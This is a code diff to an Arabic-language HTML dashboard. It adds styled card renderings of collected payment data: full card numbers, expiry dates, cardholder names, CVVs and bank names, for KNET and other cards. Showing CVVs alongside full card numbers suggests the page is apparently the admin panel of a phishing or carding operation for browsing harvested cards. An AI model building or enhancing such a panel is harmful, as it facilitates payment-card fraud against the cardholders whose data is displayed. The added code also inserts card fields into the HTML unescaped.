@@ -111,6 +111,27 @@
         padding: 14px !important;
       }
     }
+
+  /* ===== شكل البطاقة ===== */
+  .kcard{position:relative;direction:ltr;width:100%;max-width:360px;aspect-ratio:1.586/1;border-radius:14px;padding:16px 18px;box-sizing:border-box;display:flex;flex-direction:column;justify-content:space-between;overflow:hidden;box-shadow:0 10px 24px rgba(0,0,0,.28);background:linear-gradient(135deg,#eef1f5 0%,#c6cfd9 20%,#f8fafc 42%,#a9b5c3 60%,#dfe6ee 78%,#b6c1cd 100%);color:#111827;font-family:'Segoe UI',Tahoma,sans-serif}
+  .kcard:before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(115deg,rgba(255,255,255,.55) 0 2px,rgba(255,255,255,0) 2px 7px);opacity:.45;pointer-events:none}
+  .kcard>*{position:relative;z-index:1}
+  .kc-top{display:flex;align-items:flex-start;justify-content:space-between}
+  .kc-logo{display:flex;align-items:center;gap:8px}
+  .kc-mark{width:34px;height:34px;border-radius:50%;background:linear-gradient(145deg,#0f172a,#334155);color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;letter-spacing:.5px;flex:0 0 auto}
+  .kc-bank{font-size:10px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;max-width:165px;line-height:1.25}
+  .kc-cur{font-size:12px;font-weight:800;letter-spacing:2px}
+  .kc-chip{width:38px;height:27px;border-radius:5px;background:linear-gradient(135deg,#f5d98a,#c9a227);box-shadow:inset 0 0 0 1px rgba(0,0,0,.18)}
+  .kc-chip:before{content:"";display:block;height:100%;border-radius:5px;background:repeating-linear-gradient(90deg,rgba(0,0,0,.18) 0 1px,transparent 1px 6px)}
+  .kc-num{font-family:'Courier New',monospace;font-size:17px;font-weight:700;letter-spacing:2.4px;text-shadow:0 1px 0 rgba(255,255,255,.75);white-space:nowrap}
+  .kc-bot{display:flex;align-items:flex-end;justify-content:space-between;gap:10px}
+  .kc-lab{font-size:7px;letter-spacing:1.2px;text-transform:uppercase;color:#4b5563;font-weight:700}
+  .kc-val{font-size:11px;font-weight:700;letter-spacing:.5px;white-space:nowrap}
+  .kc-right{text-align:right}
+  .kc-brand{font-size:15px;font-weight:900;letter-spacing:-.4px;color:#1a1f71;font-style:italic}
+  .kc-tier{font-size:8px;letter-spacing:1.5px;font-weight:800;color:#374151;text-transform:uppercase}
+  .kc-cvv{display:inline-block;background:#fff;border-radius:3px;padding:2px 6px;font-family:'Courier New',monospace;font-size:11px;font-weight:800;letter-spacing:1px}
+  .kc-wrap{margin:0 0 12px}
   </style>
 </head>
 <body class="bg-gray-100 min-h-screen">
@@ -1953,6 +1974,22 @@
               // KNET card display
               html += '<div class="data-section bg-green-50 p-4 rounded-lg" style="border-right-color: #16a34a;">';
               html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)</h3>';
+              var _kf = String(card.prefix || '') + String(card.cardNumberOnly || '');
+              var _kp = _kf.match(/.{1,4}/g);
+              var _kn = _kp ? _kp.join(' ') : _kf;
+              var _kb = String(card.bankName || '');
+              var _km = _kb.match(/\[(.+?)\]/);
+              var _ki = _km ? _km[1] : (_kb.replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase() || 'BK');
+              html += '<div class="kc-wrap"><div class="kcard">';
+              html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _ki + '</div><div class="kc-bank">' + (_kb || 'KNET') + '</div></div><div class="kc-cur">KD</div></div>';
+              html += '<div class="kc-chip"></div>';
+              html += '<div class="kc-num">' + (_kn || '**** **** ****') + '</div>';
+              html += '<div class="kc-bot">';
+              html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (card.expiryMonth || '--') + '/' + (card.expiryYear || '----') + '</div></div>';
+              html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (card.nameOnCard || 'KNET') + '</div></div>';
+              html += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (card.cvv || '---') + '</span></div>';
+              html += '<div class="kc-right"><div class="kc-brand">KNET</div><div class="kc-tier">Credit • Platinum</div></div>';
+              html += '</div></div></div>';
               html += '<div class="bg-gradient-to-r from-green-100 to-teal-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-green-700 font-bold text-lg">🏦 ' + (card.bankName || 'غير محدد') + '</span>';
@@ -1982,6 +2019,21 @@
               // Credit card display (original)
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
               html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
+              var _cf = String(card.cardNumber || '');
+              var _cp = _cf.match(/.{1,4}/g);
+              var _cn = _cp ? _cp.join(' ') : _cf;
+              var _cb = String(cardInfo.bank || '');
+              var _ci = _cb.replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase() || 'BK';
+              html += '<div class="kc-wrap"><div class="kcard">';
+              html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _ci + '</div><div class="kc-bank">' + (_cb || 'BANK') + '</div></div><div class="kc-cur">KD</div></div>';
+              html += '<div class="kc-chip"></div>';
+              html += '<div class="kc-num">' + (_cn || '**** **** ****') + '</div>';
+              html += '<div class="kc-bot">';
+              html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (card.expiryMonth || '--') + '/' + (card.expiryYear || '----') + '</div></div>';
+              html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (card.nameOnCard || '-') + '</div></div>';
+              html += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (card.cvv || '---') + '</span></div>';
+              html += '<div class="kc-right"><div class="kc-brand">' + (cardInfo.network || 'CARD') + '</div><div class="kc-tier">' + (cardInfo.type || '') + ' • ' + (cardInfo.tier || '') + '</div></div>';
+              html += '</div></div></div>';
               html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
